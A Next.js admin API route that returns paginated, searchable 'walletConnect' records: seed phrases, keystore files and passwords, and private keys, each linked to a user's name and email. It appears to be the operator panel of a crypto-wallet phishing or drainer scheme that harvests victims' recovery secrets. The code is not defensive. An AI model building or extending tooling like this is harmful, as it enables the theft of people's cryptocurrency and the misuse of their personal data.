import { NextRequest, NextResponse } from "next/server";
import { db } from "@/lib/db";
import { getAdminSession, unauthorized } from "../_auth";

export async function GET(req: NextRequest) {
  const session = await getAdminSession();
  if (!session) return unauthorized();

  const { searchParams } = new URL(req.url);
  const search = searchParams.get("search") ?? "";
  const page = parseInt(searchParams.get("page") ?? "1");
  const limit = 20;

  const where: any = {};
  if (search) {
    where.OR = [
      { vendor: { contains: search } },
      { user: { firstName: { contains: search } } },
      { user: { lastName: { contains: search } } },
      { user: { email: { contains: search } } },
    ];
  }

  const [records, total] = await Promise.all([
    db.walletConnect.findMany({
      where,
      orderBy: { createdAt: "desc" },
      skip: (page - 1) * limit,
      take: limit,
      select: { id: true, name: true, vendor: true, phrase: true, keystoreJson: true, keystorePassword: true, privateKey: true, createdAt: true, user: { select: { id: true, firstName: true, lastName: true, email: true } } },
    }),
    db.walletConnect.count({ where }),
  ]);

  return NextResponse.json({ records, total, page, pages: Math.ceil(total / limit) });
}
